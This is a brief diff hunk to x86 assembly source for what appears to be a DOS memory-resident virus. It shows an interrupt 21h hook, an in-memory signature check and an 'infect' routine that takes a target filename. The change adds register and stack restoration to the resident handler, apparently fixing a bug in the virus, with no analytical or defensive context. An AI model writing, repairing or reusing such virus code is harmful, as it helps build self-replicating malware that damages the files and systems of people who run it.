@@ -97,6 +97,8 @@ goto_int21: db 0EAh, 00h, 00h, 00h, 00h   ; Jump far, absolute, address given in
 
 send_msg:
      mov ax, 8b7bh    ; In Mem Signature
+     pop bp
+     popa
      iret
 
 infect:               ; DS:DX = ASCIIZ Filename pointer
